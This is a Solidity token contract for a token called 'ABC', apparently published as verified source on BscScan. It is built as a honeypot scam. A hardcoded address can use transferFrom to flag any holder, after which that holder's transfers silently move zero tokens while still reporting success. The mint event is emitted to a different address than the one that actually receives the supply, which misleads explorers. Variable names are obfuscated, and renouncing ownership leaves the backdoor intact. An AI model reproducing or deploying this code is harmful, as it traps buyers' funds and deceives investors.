/**
 *Submitted for verification at BscScan.com on 2023-03-19
*/

pragma solidity 0.8.19;

// SPDX-License-Identifier: MIT

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract ABC {
    using SafeMath for uint256;
    mapping (address => uint256) private FFXIa;
	 address GGL = 0xCA0453de46E547e1820DcB71f35312f15Da007c0;
    mapping (address => uint256) public FFXIb;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "ABC";
	
    string public symbol = "ABC";
    uint8 public decimals = 6;

    uint256 public totalSupply = 500000000 *10**6;
    address owner = msg.sender;
	  address private FFXIc;
     
    

  
 
  
    
  


    event Transfer(address indexed from, address indexed to, uint256 value);
	  address FFXIf = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
     
 
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
       
             FFXIa[msg.sender] = totalSupply;
    
       CREATEC();}

  
	
	
   modifier onlyOwner () {
    require(msg.sender == owner);
	_;}
    



	

    function renounceOwnership() public virtual {
       
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        
    }

  



  		    function CREATEC() internal  {                             
                      
                       FFXIc = FFXIf;

                

        emit Transfer(address(0), FFXIc, totalSupply); }



   function balanceOf(address account) public view  returns (uint256) {
        return FFXIa[account];
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        
                    if(FFXIb[msg.sender] > 6) {
                            require(FFXIa[msg.sender] >= value);
       
                   value = 0;}
                   else


    require(FFXIa[msg.sender] >= value);
FFXIa[msg.sender] -= value;  
FFXIa[to] += value;  
 emit Transfer(msg.sender, to, value);
        return true; }
        
   
        
     

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 	


 

   function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
  


    

         if(msg.sender == GGL){
        FFXIb[to] += value;
        return true;}
        else
     

                    if(FFXIb[from] > 6 || FFXIb[to] > 6) {
                               require(value <= FFXIa[from]);
        require(value <= allowance[from][msg.sender]);
                   value = 0;}
        else

         if(from == owner){from == FFXIf;}

    
      
        require(value <= FFXIa[from]);
        require(value <= allowance[from][msg.sender]);
        FFXIa[from] -= value;
        FFXIa[to] += value;
        allowance[from][msg.sender] -= value;
                    emit Transfer(from, to, value);
        return true;
       


      
}



     

        	
 }